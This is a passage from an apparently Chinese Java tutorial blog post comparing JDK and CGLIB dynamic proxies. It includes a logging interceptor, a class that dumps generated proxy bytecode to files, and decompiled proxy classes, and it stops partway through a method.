&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; CglibDynamicProxy &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; MethodInterceptor {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 目标对象
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object targetObject;

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 创建Cglib动态代理
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; targetObject
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; Object createCglibDynamicProxy(&lt;span&gt;final&lt;/span&gt;&lt;span&gt; Object targetObject){
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.targetObject =&lt;span&gt; targetObject;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Cglib中的核心对象，该类用于生成代理对象&lt;/span&gt;
        Enhancer enhancer = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Enhancer();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;指定委托类也就是目标对象为父类&lt;/span&gt;
        enhancer.setSuperclass(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.targetObject.getClass());
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;使用代理，需要一个对应的代理对象&lt;/span&gt;
        enhancer.setCallback(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; enhancer.create();
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Object intercept(Object o, Method method, Object[] args, MethodProxy methodProxy) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Throwable {
        System.out.println(&lt;/span&gt;&quot;CGLIB日志记录开始&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;委托类变成了父类。调用真正的服务提供者&lt;/span&gt;
        Object obj = methodProxy.invoke(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.targetObject,args);
        System.out.println(&lt;/span&gt;&quot;CGLIB日志记录结束&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; obj;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　JDK代理的实现方式是基于接口实现，代理类继承Proxy，实现接口。而CGLIB继承被代理的类来实现；这就是为什么JDK动态代理需要实现接口的原因？&lt;span&gt;&lt;strong&gt;J&lt;span&gt;ava&lt;/span&gt;是单继承&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　下面定义一个字节码生成器ByteCodeGenerator来一看究竟：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.proxy.generator;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.service.impl.UserServiceImpl;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.proxy.Enhancer;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.proxy.MethodInterceptor;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; sun.misc.ProxyGenerator;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.io.File;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.io.FileOutputStream;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Modifier;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.nio.file.Files;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: 字节码生成器
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 0:05
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ByteCodeGenerator {
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 根据目标对象生成字节码(Jdk)
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; target
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; &amp;lt;T&amp;gt;
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &amp;lt;T&amp;gt; &lt;span&gt;byte&lt;/span&gt;&lt;span&gt;[] generatorByteCodeByJdkProxy(T target){
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; accessFlags = Modifier.PUBLIC |&lt;span&gt; Modifier.FINAL;
        &lt;/span&gt;&lt;span&gt;byte&lt;/span&gt; [] codes = ProxyGenerator.generateProxyClass(&quot;Proxy$&quot;+&lt;span&gt;target.getClass().getName(), target.getClass().getInterfaces(),accessFlags);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; codes;
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 根据目标对象生成字节码(Cglib)
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; target
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; &amp;lt;T&amp;gt;
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;
     * &lt;/span&gt;&lt;span&gt;@throws&lt;/span&gt;&lt;span&gt; Exception
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &amp;lt;T&amp;gt; &lt;span&gt;byte&lt;/span&gt;[] generatorByteCodeByCglib(&lt;span&gt;final&lt;/span&gt; T target) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        Enhancer enhancer &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Enhancer();
        enhancer.setSuperclass(target.getClass());
        enhancer.setCallback((MethodInterceptor) (o, method, objects, methodProxy) &lt;/span&gt;-&amp;gt;&lt;span&gt; methodProxy.invoke(target,objects));
        enhancer.create();
        &lt;/span&gt;&lt;span&gt;byte&lt;/span&gt; [] codes =&lt;span&gt; enhancer.getStrategy().generate(enhancer);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; codes;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 测试jdk
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;byte&lt;/span&gt; [] codes = ByteCodeGenerator.generatorByteCodeByJdkProxy(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; UserServiceImpl());
            File file &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; File(System.getProperty(&quot;user.dir&quot;)+&quot;/spring-aop/target/Proxy$UserServiceImpl.class&quot;&lt;span&gt;);
            Files.write(file.toPath(),codes);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception e) {
            e.printStackTrace();
        }
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 测试cglib
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            FileOutputStream out &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; FileOutputStream(System.getProperty(&quot;user.dir&quot;)+&quot;/spring-aop/target/Cglib$UserServiceImpl.class&quot;&lt;span&gt;);
            out.write(ByteCodeGenerator.generatorByteCodeByCglib(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; UserServiceImpl()));
            out.flush();
            out.close();
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;Jdk生成的动态代理字节码：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Source code recreated from a .class file by IntelliJ IDEA
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; (powered by Fernflower decompiler)
&lt;/span&gt;&lt;span&gt;//
&lt;/span&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; Proxy$com.toby.service.impl;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.service.UserService;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.InvocationHandler;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Method;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Proxy;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.UndeclaredThrowableException;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; UserServiceImpl &lt;span&gt;extends&lt;/span&gt; Proxy &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; UserService {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Method m1;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Method m2;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Method m3;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Method m0;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; UserServiceImpl(InvocationHandler var1) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt;  {
        &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;(var1);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; equals(Object var1) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt;  {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Boolean)&lt;span&gt;super&lt;/span&gt;.h.invoke(&lt;span&gt;this&lt;/span&gt;, m1, &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Object[]{var1});
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt; (RuntimeException |&lt;span&gt; Error var3) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt;&lt;span&gt; var3;
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable var4) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UndeclaredThrowableException(var4);
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; String toString() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt;  {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (String)&lt;span&gt;super&lt;/span&gt;.h.invoke(&lt;span&gt;this&lt;/span&gt;, m2, (Object[])&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt; (RuntimeException |&lt;span&gt; Error var2) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt;&lt;span&gt; var2;
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable var3) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UndeclaredThrowableException(var3);
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; add() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt;  {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;.h.invoke(&lt;span&gt;this&lt;/span&gt;, m3, (Object[])&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt; (RuntimeException |&lt;span&gt; Error var2) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt;&lt;span&gt; var2;
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable var3) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UndeclaredThrowableException(var3);
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; hashCode() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt;  {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Integer)&lt;span&gt;super&lt;/span&gt;.h.invoke(&lt;span&gt;this&lt;/span&gt;, m0, (Object[])&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt; (RuntimeException |&lt;span&gt; Error var2) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt;&lt;span&gt; var2;
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable var3) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UndeclaredThrowableException(var3);
        }
    }

    &lt;/span&gt;&lt;span&gt;static&lt;/span&gt;&lt;span&gt; {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            m1 &lt;/span&gt;= Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;equals&quot;, Class.forName(&quot;java.lang.Object&quot;&lt;span&gt;));
            m2 &lt;/span&gt;= Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;toString&quot;&lt;span&gt;);
            m3 &lt;/span&gt;= Class.forName(&quot;com.toby.service.UserService&quot;).getMethod(&quot;add&quot;&lt;span&gt;);
            m0 &lt;/span&gt;= Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;hashCode&quot;&lt;span&gt;);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (NoSuchMethodException var2) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NoSuchMethodError(var2.getMessage());
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (ClassNotFoundException var3) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NoClassDefFoundError(var3.getMessage());
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;strong&gt;&lt;span&gt;Cglib生成&lt;strong&gt;动态代理的&lt;/strong&gt;字节码：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;83&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Source code recreated from a .class file by IntelliJ IDEA
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; (powered by Fernflower decompiler)
&lt;/span&gt;&lt;span&gt;//
&lt;/span&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.service.impl;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Method;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.core.ReflectUtils;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.core.Signature;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.proxy.Callback;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.proxy.Factory;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.proxy.MethodInterceptor;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.proxy.MethodProxy;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; UserServiceImpl$$EnhancerByCGLIB$$b26297df &lt;span&gt;extends&lt;/span&gt; UserServiceImpl &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Factory {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; CGLIB$BOUND;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Object CGLIB$FACTORY_DATA;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; ThreadLocal CGLIB$THREAD_CALLBACKS;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; Callback[] CGLIB$STATIC_CALLBACKS;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; MethodInterceptor CGLIB$CALLBACK_0;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Object CGLIB$CALLBACK_FILTER;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Method CGLIB$add$0&lt;span&gt;$Method;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; MethodProxy CGLIB$add$0&lt;span&gt;$Proxy;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; Object[] CGLIB$emptyArgs;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Method CGLIB$equals$1&lt;span&gt;$Method;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; MethodProxy CGLIB$equals$1&lt;span&gt;$Proxy;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Method CGLIB$toString$2&lt;span&gt;$Method;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; MethodProxy CGLIB$toString$2&lt;span&gt;$Proxy;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Method CGLIB$hashCode$3&lt;span&gt;$Method;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; MethodProxy CGLIB$hashCode$3&lt;span&gt;$Proxy;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Method CGLIB$clone$4&lt;span&gt;$Method;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; MethodProxy CGLIB$clone$4&lt;span&gt;$Proxy;

    &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; CGLIB$STATICHOOK2() {
        CGLIB$THREAD_CALLBACKS &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ThreadLocal();
        CGLIB$emptyArgs &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Object[0&lt;span&gt;];
        Class var0 &lt;/span&gt;= Class.forName(&quot;com.toby.service.impl.UserServiceImpl$$EnhancerByCGLIB$$b26297df&quot;&lt;span&gt;);
        Class var1;
        Method[] var10000 &lt;/span&gt;= ReflectUtils.findMethods(&lt;span&gt;new&lt;/span&gt; String[]{&quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;, &quot;toString&quot;, &quot;()Ljava/lang/String;&quot;, &quot;hashCode&quot;, &quot;()I&quot;, &quot;clone&quot;, &quot;()Ljava/lang/Object;&quot;}, (var1 = Class.forName(&quot;java.lang.Object&quot;&lt;span&gt;)).getDeclaredMethods());
        CGLIB$equals$&lt;/span&gt;1$Method = var10000[0&lt;span&gt;];
        CGLIB$equals$&lt;/span&gt;1$Proxy = MethodProxy.create(var1, var0, &quot;(Ljava/lang/Object;)Z&quot;, &quot;equals&quot;, &quot;CGLIB$equals$1&quot;&lt;span&gt;);
        CGLIB$toString$&lt;/span&gt;2$Method = var10000[1&lt;span&gt;];
        CGLIB$toString$&lt;/span&gt;2$Proxy = MethodProxy.create(var1, var0, &quot;()Ljava/lang/String;&quot;, &quot;toString&quot;, &quot;CGLIB$toString$2&quot;&lt;span&gt;);
        CGLIB$hashCode$&lt;/span&gt;3$Method = var10000[2&lt;span&gt;];
        CGLIB$hashCode$&lt;/span&gt;3$Proxy = MethodProxy.create(var1, var0, &quot;()I&quot;, &quot;hashCode&quot;, &quot;CGLIB$hashCode$3&quot;&lt;span&gt;);
        CGLIB$clone$&lt;/span&gt;4$Method = var10000[3&lt;span&gt;];
        CGLIB$clone$&lt;/span&gt;4$Proxy = MethodProxy.create(var1, var0, &quot;()Ljava/lang/Object;&quot;, &quot;clone&quot;, &quot;CGLIB$clone$4&quot;&lt;span&gt;);
        CGLIB$add$&lt;/span&gt;0$Method = ReflectUtils.findMethods(&lt;span&gt;new&lt;/span&gt; String[]{&quot;add&quot;, &quot;()V&quot;}, (var1 = Class.forName(&quot;com.toby.service.impl.UserServiceImpl&quot;)).getDeclaredMethods())[0&lt;span&gt;];
        CGLIB$add$&lt;/span&gt;0$Proxy = MethodProxy.create(var1, var0, &quot;()V&quot;, &quot;add&quot;, &quot;CGLIB$add$0&quot;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; CGLIB$add$0&lt;span&gt;() {
        &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;.add();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; add() {
        MethodInterceptor var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            CGLIB$BIND_CALLBACKS(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
            var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
        }

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000 != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            var10000.intercept(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;, CGLIB$add$0$Method, CGLIB$emptyArgs, CGLIB$add$0&lt;span&gt;$Proxy);
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;.add();
        }
    }

    &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; CGLIB$equals$1&lt;span&gt;(Object var1) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;super&lt;/span&gt;&lt;span&gt;.equals(var1);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; equals(Object var1) {
        MethodInterceptor var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            CGLIB$BIND_CALLBACKS(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
            var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
        }

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000 != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            Object var2 &lt;/span&gt;= var10000.intercept(&lt;span&gt;this&lt;/span&gt;, CGLIB$equals$1$Method, &lt;span&gt;new&lt;/span&gt; Object[]{var1}, CGLIB$equals$1&lt;span&gt;$Proxy);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; var2 == &lt;span&gt;null&lt;/span&gt; ? &lt;span&gt;false&lt;/span&gt;&lt;span&gt; : (Boolean)var2;
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;super&lt;/span&gt;&lt;span&gt;.equals(var1);
        }
    }

    &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; String CGLIB$toString$2&lt;span&gt;() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;super&lt;/span&gt;&lt;span&gt;.toString();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; String toString() {
        MethodInterceptor var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            CGLIB$BIND_CALLBACKS(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
            var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; var10000 != &lt;span&gt;null&lt;/span&gt; ? (String)var10000.intercept(&lt;span&gt;this&lt;/span&gt;, CGLIB$toString$2$Method, CGLIB$emptyArgs, CGLIB$toString$2$Proxy) : &lt;span&gt;super&lt;/span&gt;&lt;span&gt;.toString();
    }

    &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; CGLIB$hashCode$3&lt;span&gt;() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;super&lt;/span&gt;&lt;span&gt;.hashCode();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; hashCode() {
        MethodInterceptor var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            CGLIB$BIND_CALLBACKS(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
            var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
        }

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000 != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            Object var1 &lt;/span&gt;= var10000.intercept(&lt;span&gt;this&lt;/span&gt;, CGLIB$hashCode$3$Method, CGLIB$emptyArgs, CGLIB$hashCode$3&lt;span&gt;$Proxy);
